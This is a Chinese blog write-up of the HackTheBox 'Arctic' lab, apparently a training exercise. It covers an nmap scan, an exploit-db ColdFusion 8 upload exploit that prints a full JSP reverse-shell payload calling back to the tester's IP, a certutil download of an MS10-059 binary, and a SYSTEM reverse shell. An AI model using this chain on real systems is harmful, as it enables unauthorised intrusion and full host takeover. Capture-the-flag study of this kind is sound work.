<!DOCTYPE html>
<html>
        <head>
        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
        <meta charset="utf-8">
        <title>HackTheBox-arctic | 老白</title>
        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
         <script >hljs.initHighlightingOnLoad();</script>

    </head>
    <body>
              <header class="header mdui-m-b-5">      
            <div class="container  ">
                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
           
            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
                   
                            <li><a href="/">首页</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                            <li><a href="/archives">归档</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                            <li><a href="/tags">标签</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                  </nav>
                </div>
        </header>
        <div class="mdui-container ">
                <div class="mdui-row">
                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
                                    <div class="post-title  mdui-m-b-1">HackTheBox-arctic</div>
                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-04-28 21:39:39">2022-04-28 / 14 min read</div>
                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><p>10.129.128.222</p>
<p>扫一下端口，发现有135、8000、49154</p>
<pre><code>╭─root@Ali-SG ~ 
╰─# nmap -A -T4 10.129.128.222
Starting Nmap 7.70 ( https://nmap.org ) at 2022-04-28 17:20 CST
Nmap scan report for 10.129.128.222
Host is up (0.0035s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT     ADDRESS
1  29 3.41 ms 10.10.14.1
2   3.46 ms 10.129.128.222

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.05 seconds

</code></pre>
<p>访问web，发现目录</p>
<p><img src="https://V-alkoinen.github.io/post-images/1651153302030.png" alt="" loading="lazy"><br>
http://10.129.128.222:8500/CFIDE/administrator/</p>
<p>弱口令爆破，无果</p>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1651153317677.png" alt="" loading="lazy"></figure>
<p>exploitdb找一下</p>
<pre><code>╭─root@Ali-SG /laobai/arctic 
╰─# searchsploit coldfusion 8
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                  | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                   | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                          | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                        | multiple/webapps/45979.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                  | cfm/webapps/50057.py
Adobe ColdFusion &lt; 11 Update 10 - XML External Entity Injection                                                                                      | multiple/webapps/40346.py
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                         | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                      | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                               | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                                | cfm/webapps/33168.txt
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                                    | cfm/webapps/16788.rb
ColdFusion MX - Missing Template Cross-Site Scripting                                                                                                | cfm/remote/21548.txt
Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure                                                                            | multiple/remote/22867.pl
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

╭─root@Ali-SG /laobai/arctic 
╰─# cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .    


</code></pre>
<p>看起来是一个未授权文件上传，改一下目标地址</p>
<pre><code>╭─root@Ali-SG /laobai/arctic 
╰─# python3 50057.py          

Generating a payload...
Payload size: 1496 bytes
Saved as: d42c2c481a7f434ba650ed191d3a3222.jsp

Priting request...
Content-type: multipart/form-data; boundary=01127b023fb94841b7cb205deba74f14
Content-length: 1697

--01127b023fb94841b7cb205deba74f14
Content-Disposition: form-data; name=&quot;newfile&quot;; filename=&quot;d42c2c481a7f434ba650ed191d3a3222.txt&quot;
Content-Type: text/plain

&lt;%@page import=&quot;java.lang.*&quot;%&gt;
&lt;%@page import=&quot;java.util.*&quot;%&gt;
&lt;%@page import=&quot;java.io.*&quot;%&gt;
&lt;%@page import=&quot;java.net.*&quot;%&gt;

&lt;%
  class StreamConnector extends Thread
  {
    InputStream zf;
    OutputStream o6;

    StreamConnector( InputStream zf, OutputStream o6 )
    {
      this.zf = zf;
      this.o6 = o6;
    }

    public void run()
    {
      BufferedReader mm  = null;
      BufferedWriter s2F = null;
      try
      {
        mm  = new BufferedReader( new InputStreamReader( this.zf ) );
        s2F = new BufferedWriter( new OutputStreamWriter( this.o6 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = mm.read( buffer, 0, buffer.length ) ) &gt; 0 )
        {
          s2F.write( buffer, 0, length );
          s2F.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( mm != null )
          mm.close();
        if( s2F != null )
          s2F.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) {
  ShellPath = new String(&quot;/bin/sh&quot;);
} else {
  ShellPath = new String(&quot;cmd.exe&quot;);
}

    Socket socket = new Socket( &quot;10.10.14.6&quot;, 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%&gt;

--01127b023fb94841b7cb205deba74f14--


Sending request and printing response...


		&lt;script type=&quot;text/javascript&quot;&gt;
			window.parent.OnUploadCompleted( 0, &quot;/userfiles/file/d42c2c481a7f434ba650ed191d3a3222.jsp/d42c2c481a7f434ba650ed191d3a3222.txt&quot;, &quot;d42c2c481a7f434ba650ed191d3a3222.txt&quot;, &quot;0&quot; );
		&lt;/script&gt;
	

Printing some information for debugging...
lhost: 10.10.14.6
lport: 4444
rhost: 10.129.128.222
rport: 8500
payload: d42c2c481a7f434ba650ed191d3a3222.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.128.222] 49884







Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin&gt;whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\ColdFusion8\runtime\bin

22/03/2017  09:53 ££    &lt;DIR&gt;          .
22/03/2017  09:53 ££    &lt;DIR&gt;          ..
18/03/2008  12:11 ££            64.512 java2wsdl.exe
19/01/2008  10:59 §£         2.629.632 jikes.exe
18/03/2008  12:11 ££            64.512 jrun.exe
18/03/2008  12:11 ££            71.680 jrunsvc.exe
18/03/2008  12:11 ££             5.120 jrunsvcmsg.dll
18/03/2008  12:11 ££            64.512 jspc.exe
22/03/2017  09:53 ££             1.804 jvm.config
18/03/2008  12:11 ££            64.512 migrate.exe
18/03/2008  12:11 ££            34.816 portscan.dll
18/03/2008  12:11 ££            64.512 sniffer.exe
18/03/2008  12:11 ££            78.848 WindowsLogin.dll
18/03/2008  12:11 ££            64.512 wsconfig.exe
22/03/2017  09:53 ££             1.013 wsconfig_jvm.config
18/03/2008  12:11 ££            64.512 wsdl2java.exe
18/03/2008  12:11 ££            64.512 xmlscript.exe
              15 File(s)      3.339.009 bytes
               2 Dir(s)   1.432.330.240 bytes free

C:\ColdFusion8\runtime\bin&gt;systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 §£
System Boot Time:          29/4/2022, 8:14:31 ££
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.048 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.235 MB
Virtual Memory: In Use:    1.050 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.128.222

</code></pre>
<p>查找提权漏洞</p>
<pre><code>╭─root@Ali-SG /laobai 
╰─# python2 windows-exploit-suggester.py --database 2022-04-26-mssb.xls --systeminfo arctic/systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

╭─root@Ali-SG /laobai 
╰─# wget https://raw.githubusercontent.com/k4u5h41/MS10-059/main/MS10-059.exe                                                                                    
--2022-04-28 20:21:05--  https://raw.githubusercontent.com/k4u5h41/MS10-059/main/MS10-059.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 784384 (766K) [application/octet-stream]
Saving to: ‘MS10-059.exe’

MS10-059.exe                                  100%[================================================================================================&gt;] 766.00K  --.-KB/s    in 0.01s   

2022-04-28 20:21:06 (78.0 MB/s) - ‘MS10-059.exe’ saved [784384/784384]


╭─root@Ali-SG /laobai/arctic 
╰─# python3 -m http.server 9999

╭─root@Ali-SG /laobai/arctic 
╰─# nc -nvlp 9999                 
listening on [any] 9999 ...

</code></pre>
<p>certutil -urlcache -split -f http://10.10.14.6:9999/MS10-059.exe ms10-059.exe</p>
<pre><code>C:\ColdFusion8\runtime\bin&gt;certutil -urlcache -split -f http://10.10.14.6:9999/MS10-059.exe ms10-059.exe 


certutil -urlcache -split -f http://10.10.14.6:9999/MS10-059.exe ms10-059.exe 
****  Online  ****
  000000  ...
  0bf800
CertUtil: -URLCache command completed successfully.

C:\ColdFusion8\runtime\bin&gt;
C:\ColdFusion8\runtime\bin&gt;
C:\ColdFusion8\runtime\bin&gt;dir   
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\ColdFusion8\runtime\bin

29/04/2022  11:20 ££    &lt;DIR&gt;          .
29/04/2022  11:20 ££    &lt;DIR&gt;          ..
18/03/2008  12:11 ££            64.512 java2wsdl.exe
19/01/2008  10:59 §£         2.629.632 jikes.exe
18/03/2008  12:11 ££            64.512 jrun.exe
18/03/2008  12:11 ££            71.680 jrunsvc.exe
18/03/2008  12:11 ££             5.120 jrunsvcmsg.dll
18/03/2008  12:11 ££            64.512 jspc.exe
22/03/2017  09:53 ££             1.804 jvm.config
18/03/2008  12:11 ££            64.512 migrate.exe
29/04/2022  11:20 ££           784.384 ms10-059.exe
18/03/2008  12:11 ££            34.816 portscan.dll
18/03/2008  12:11 ££            64.512 sniffer.exe
18/03/2008  12:11 ££            78.848 WindowsLogin.dll
18/03/2008  12:11 ££            64.512 wsconfig.exe
22/03/2017  09:53 ££             1.013 wsconfig_jvm.config
18/03/2008  12:11 ££            64.512 wsdl2java.exe
18/03/2008  12:11 ££            64.512 xmlscript.exe
              16 File(s)      4.123.393 bytes
               2 Dir(s)   1.426.751.488 bytes free

C:\ColdFusion8\runtime\bin&gt;ms10-059.exe 10.10.14.6 9999
ms10-059.exe 10.10.14.6 9999
/Chimichurri/--&gt;This exploit gives you a Local System shell &lt;BR&gt;/Chimichurri/--&gt;Changing registry values...&lt;BR&gt;/Chimichurri/--&gt;Got SYSTEM token...&lt;BR&gt;/Chimichurri/--&gt;Running reverse shell...&lt;BR&gt;/Chimichurri/--&gt;Restoring default registry values...&lt;BR&gt;

</code></pre>
<p>GET!</p>
<pre><code>╭─root@Ali-SG /laobai/arctic 
╰─# nc -nvlp 9999                 
listening on [any] 9999 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.128.222] 49924
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin&gt;whoami
whoami
nt authority\system

C:\ColdFusion8\runtime\bin&gt;

</code></pre>
</div>
                                    <div class="mdui-divider mdui-m-b-2"></div>
                                    <div class="mdui-row-xs-2 post-fenye">
                                       
                                        <div class="mdui-col"> </div>
                                        

                                        
                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/hackthebox-granny/">HackTheBox-granny</a></div> </div>
                                       
                                      </div>
                                   
                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
                                    
                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
 <div class="comment"></div>

<script>
      new Valine({
            el: '.comment',



            path: window.location.pathname,
            pageSize: 30,
            avatar:'mm', 
       })
    </script> 
<script>
    if(window.location.hash){
        var checkExist = setInterval(function() {
           if ($(window.location.hash).length) {
              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
              clearInterval(checkExist);
           }
        }, 100);
    }
</script>
                                </article>

                                    
                        </div>
                      </div>
    
                

              </div>
                    <footer class="footer mdui-m-t-5 mdui-text-center">
               <nav class="social-links">
                      <ul>
                      
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      </ul>
                    </nav>
                    <div class="copyright">
                      
                  </div>
                  
              </footer>
    </body>
</html>